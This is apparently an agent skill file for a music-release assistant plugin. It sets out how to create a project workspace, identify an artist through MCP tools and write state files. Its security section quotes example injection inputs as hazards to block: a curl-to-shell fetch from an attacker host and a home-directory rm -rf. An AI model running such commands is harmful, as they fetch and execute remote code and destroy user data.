---
name: start
description: Bootstrap a new Aria music-project workspace. Use when the user starts planning a new single, EP, album, or campaign and wants AI guidance from idea to launch. Creates `.patchline/` in the current directory, initializes PROJECT.md + STATE.md grounded in real Patchline artist intelligence, and routes to the creative-brief phase. Invoke via `/aria:start`.
argument-hint: "[optional artist name or Spotify URL to pre-fill identity]"
model: claude-sonnet-4-6
allowed-tools:
  - Read
  - Write
  - Edit
  - Bash
  - Glob
  - AskUserQuestion
  - aria
---

## Your Task

Bootstrap a new Aria-managed project workspace for the user. By the end of this skill you will have:

1. A `.patchline/` directory in the current working directory
2. `.patchline/PROJECT.md` — artist identity, project name, distribution mode
3. `.patchline/STATE.md` — the ledger that tracks lifecycle phase progression
4. `.patchline/artifacts/` — empty subdirectory for phase outputs
5. The user clearly routed to the next step (the `creative-brief` skill, invoked via `/aria:next`)

## Supporting files

- [`../../CLAUDE.md`](../../CLAUDE.md) — plugin-wide voice + MCP grounding rules (loaded automatically, but reference it if you need to refresh conventions mid-task)
- [`../../reference/state-schema.md`](../../reference/state-schema.md) — canonical STATE.md schema (sections, parsing conventions, authority split — §4 governs which fields `next` vs phase skills write)

## Security: `$ARGUMENTS` must NEVER reach Bash

`$ARGUMENTS` is user-supplied text. It can ONLY be passed to:
- `mcp__aria__analyze_url` (as the `url` argument)
- `mcp__aria__search_artists` (as the `query` argument)

**NEVER interpolate `$ARGUMENTS` into a Bash command**, a shell heredoc, or any other shell context. A user could paste `/aria:start $(curl attacker.com | sh)` or `/aria:start "; rm -rf ~"` as a social-engineering vector. If `$ARGUMENTS` contains shell metacharacters (`$`, backtick, `;`, `|`, `&`, `>`, `<`), DO NOT pass it anywhere except the two MCP tools above. If you need to parse it as a URL/string first, do so as plain text, not via Bash.

## Step 1: Check for an existing workspace

Run `ls .patchline/` via Bash. Three cases:

- **Directory doesn't exist** → proceed to Step 2.
- **Directory exists and has a PROJECT.md** → STOP. Tell the user a workspace already exists; offer three options: (a) continue with `/aria:next`, (b) archive it with `mv .patchline .patchline.archived-$(date +%Y%m%d)` and re-bootstrap, (c) nuke it with `rm -rf .patchline`. Do NOT silently overwrite — their prior state is valuable.
- **Directory exists but is empty / missing PROJECT.md** → treat as not-yet-created, proceed to Step 2.

## Step 2: Identify the artist

The user either passed an argument (`$ARGUMENTS`) or didn't. Branch:

**First prompt if no usable artist input was provided:** ask exactly:

> Paste your Spotify artist profile URL. If you don't have one, tell me your artist name.

Prefer the Spotify artist profile because `analyze_url` can parse it immediately and route to the right Patchline intelligence tools.

**Do not use Web Search, Fetch, or generic web browsing to identify the artist.** If the Aria MCP tools are unavailable, pause and tell the user: "Aria MCP is not connected yet. Run `/reload-plugins`, then `/mcp` and authenticate `plugin:aria:aria`; after that paste your Spotify artist profile URL again." Do not bootstrap from web-search snippets.

### If `$ARGUMENTS` contains a Spotify URL or artist handle

Call the MCP tool `mcp__aria__analyze_url` with the URL. Today this tool is a fast dispatcher: it returns URL type, platform ID, clean URL, and `suggestedActions[]`; it does **not** look up the artist name by itself.

If the result is `type: "spotify_artist"`:

1. Do **not** ask the user for the artist name again.
2. Immediately call `mcp__aria__add_artist` with `{ "artist_url": cleanUrl }`.
3. Use the returned canonical artist name, Patchline artist ID, Soundcharts ID, genres, and enrichment status as the identity source.
4. Then call `mcp__aria__get_artist_intelligence` with the canonical artist name returned by `add_artist`.
5. If enrichment is still pending and full intelligence is not available yet, continue with the canonical identity from `add_artist` and note in `PROJECT.md` that intelligence enrichment is pending.

This mirrors the Telegram link-handler flow: pasted Spotify artist URL first resolves through Patchline/Soundcharts, then Aria asks project questions. Never bounce back with "what is your artist name?" after a valid Spotify artist URL.

If the result is any other supported URL type, follow `suggestedActions[]` and explain the mismatch plainly: "That is a Spotify track/playlist/album URL. For project setup I need the artist profile URL, or I can continue with the artist name."

### If `$ARGUMENTS` is a plain string (artist name) or empty

Call `mcp__aria__search_artists` with the string (or ask the user for their Spotify artist profile URL / artist name if empty). The result will flag `inRoster: true/false` per artist. Prefer a match where `inRoster: true` (the user's own roster) over an intel-index hit.

### Ground the identity

Once you have a candidate artist, call `mcp__aria__get_artist_intelligence` with `artist_name`. This returns:
- `name`, `soundchartsId`, `genres`, `countryCode`, `careerStage`
- streaming metrics (monthly listeners, social followers)
- a cached `bio` if one exists

Capture this data — you'll use it to pre-fill PROJECT.md. **If `get_artist_intelligence` returns `found: false`**, do not fabricate. Ask the user: "I don't have intelligence cached for this artist yet. Should I add them first via `/aria:next` → `creative-brief` (which will call `add_artist`), or do you want to proceed with a manual-identity project?"

## Step 3: Capture project name, distribution mode, composition status

Ask the user three short questions — one at a time, not in a wall:

1. **"What's the project called?"** Accept anything — "Untitled EP", "Song #3", "My 2026 Summer Single". If they don't have a name, default to `Untitled Project (YYYY-MM-DD)`.
2. **"Are you self-releasing or working with a label on this one?"** The answer maps to `distributionMode` — either `self_releasing` or `with_label`. This materially changes downstream phases (label flows skip some content-autogeneration, add label-coordination tasks).
3. **"Do you have the music made, or are you starting from scratch?"** The answer maps to `compositionStatus`:
   - `complete` — final mixes/masters exist, just need to plan the release + promo
   - `partial` — rough sketches or demos exist, still writing
   - `writing` — starting from zero, no audio yet
   
   This determines whether the `songwriting-brief` phase is skipped. If `complete`, the chain goes `moodboard → release-plan` (skip songwriting). If `partial` or `writing`, songwriting-brief is included — Aria can help shape the song itself, not just the release around it.

Do not ask for release date, genre, or targets here. Those belong in the `release-plan` phase. Resist the urge to front-load.

## Step 4: Create the workspace

Use the Write tool to create these files in order:

### `.patchline/PROJECT.md`

```markdown
# Project: [project-name]

> Started: YYYY-MM-DD · Distribution: [self_releasing | with_label]

## Artist identity

- Name: [canonical name from MCP]
- Patchline artist ID: [patchlineArtistId if in roster, else "not in roster"]
- Soundcharts ID: [soundchartsId]
- Primary genres: [from get_artist_intelligence — first 3]
- Career stage: [careerStage from MCP]
- Country: [countryCode]
- Current monthly listeners (Spotify): [from streaming metrics]

## Project scope

- Type: <TBD — filled in creative-brief phase as single / EP / album / campaign>
- Working title: <project-name from Step 3 Q1>
- Distribution: <single value from Step 3 Q2: self_releasing OR with_label>
- Composition status: <single value from Step 3 Q3: complete OR partial OR writing>

**IMPORTANT for Claude writing this file:** substitute each `<placeholder>` with the actual user-chosen value. Never write the `A | B | C` option-list form — always pick the single value.

## Source of truth

Artifacts for each phase live under `.patchline/artifacts/`. The lifecycle progression is tracked in `STATE.md`. You can hand-edit any file; Aria will respect your edits and regenerate downstream only when you say so.
```

### `.patchline/STATE.md`

```markdown
# State

> Canonical lifecycle ledger. Updated by each skill upon successful completion.

## Current phase

`creative-brief` — pending. Run `/aria:next` to begin.

## Completed phases

(none yet)

## Artifacts

(none yet — populated under `.patchline/artifacts/` as phases complete)

## Blockers

(none)

## Distribution mode

`<substitute a single value from Step 3 Q2: self_releasing OR with_label>` — set at bootstrap, can be changed later via hand-edit.

## Composition status

`<substitute a single value from Step 3 Q3: complete OR partial OR writing>` — set at bootstrap. Determines whether `songwriting-brief` phase runs. If `complete`, chain skips directly from `moodboard` to `release-plan`.

**IMPORTANT for Claude writing this file:** write the SINGLE value the user chose, not the option list. Example: if the user said "self-releasing" in Q2, the first line becomes:
```
`self_releasing` — set at bootstrap, can be changed later via hand-edit.
```
Never write the literal `A | B | C` placeholder form — that breaks every downstream skill that parses `Distribution mode` / `Composition status` via exact-string match.

---

Last updated: YYYY-MM-DD by `/aria:start`
```

### `.patchline/artifacts/` (empty directory)

Run `mkdir -p .patchline/artifacts` via Bash.

## Step 5: Set Patchline persistence mode

Current production Aria ships as a local workspace lifecycle: it writes `.patchline/PROJECT.md`,
`.patchline/STATE.md`, and phase artifacts on disk. Patchline project persistence is not
part of the public MCP surface yet.

Append this line to `.patchline/STATE.md` under a new `## Patchline persistence` section:

`Persistence: OFF — artifacts live on disk only. Project sync is not available in the public MCP yet.`

## Step 6: Route the user to the next step

Tell the user — in ≤3 sentences:

> Workspace created at `.patchline/`. Identified you as **[artist name]** ([career stage], [top genre], [monthly listeners] monthly listeners). Run `/aria:next` to start the creative brief — I'll ask a few questions and produce `BRIEF.md` grounded in your Patchline catalog.

Do not continue into the creative-brief flow automatically. Let the user invoke it explicitly with `/aria:next`. (Rationale: some users will want to edit PROJECT.md by hand first, change distribution mode, rename the project. Give them that beat.)

## Error handling

- **`get_artist_intelligence` returns `found: false`** → see Step 2 "Ground the identity" branch.
- **`analyze_url` returns no useful identity** → fall back to asking the user plainly: "Paste your Spotify artist profile URL. If you don't have one, tell me your artist name."
- **`search_artists` returns empty and `intelligenceIndexAvailable: false`** → the intel index is degraded. Tell the user: "Patchline's shared artist index is temporarily unreachable. I can still bootstrap your workspace with a manual identity — paste your Spotify artist profile URL, or if you don't have one, tell me your artist name."
- **Write fails (permission error, disk full)** → surface the exact filesystem error and stop. Do not retry silently.
- **User's MCP auth has expired** → the MCP tool call will return an auth error. Tell the user: "Your Patchline MCP session looks expired. Run `/mcp` in Claude Code to reconnect, then try `/aria:start` again."

## Examples

### Cold start, artist in roster

```
User: /aria:start vintage culture
You (after calling get_artist_intelligence):
  Found Vintage Culture in your roster — Brazilian DJ/producer, mainstream
  career stage, 12.4M Spotify monthly listeners.

  What's the project called?
User: My next single, "Midnight Oil"
You: Are you self-releasing or working with a label on this one?
User: Spinnin'
You: Got it — with_label mode.
  (creates workspace)
  Workspace created at .patchline/. Identified you as Vintage Culture
  (mainstream, house, 12.4M listeners). Run /aria:next to start the
  creative brief — I'll ask a few questions and produce BRIEF.md
  grounded in your Patchline catalog.
```

### Cold start, new artist not in roster

```
User: /aria:start
You: Paste your Spotify artist profile URL. If you don't have one, tell me your artist name.
User: Riverbend Echo
You (calls get_artist_intelligence → found:false):
  I don't have intelligence cached for Riverbend Echo yet. Should I add
  them first via /aria:next → creative-brief (which will call
  add_artist), or do you want to proceed with a manual-identity project?
```

### Workspace already exists

```
User: /aria:start
You (detects existing .patchline/):
  You already have an Aria workspace here (started 2026-04-14, project
  "Untitled EP"). Three options:
    1. Continue — run /aria:next to pick up where you left off
    2. Archive — mv .patchline .patchline.archived-20260419 and start fresh
    3. Nuke — rm -rf .patchline (unrecoverable)
  Which one?
```

## Common mistakes (don't make these)

- **Fabricating streaming numbers** when `get_artist_intelligence` returns `found: false`. If the data isn't cached, say so. Do not invent a plausible-sounding listener count.
- **Asking all the Step-3 questions at once.** One question per turn. Users type short answers; respect the rhythm.
- **Overwriting an existing `.patchline/` silently.** Always present the three options in Step 1.
- **Continuing into creative-brief automatically.** The user invokes `/aria:next` when they're ready. Don't bulldoze.
- **Pretending project persistence is already live.** Current public Aria writes local artifacts only; do not claim Patchline Project sync until the MCP explicitly exposes it.
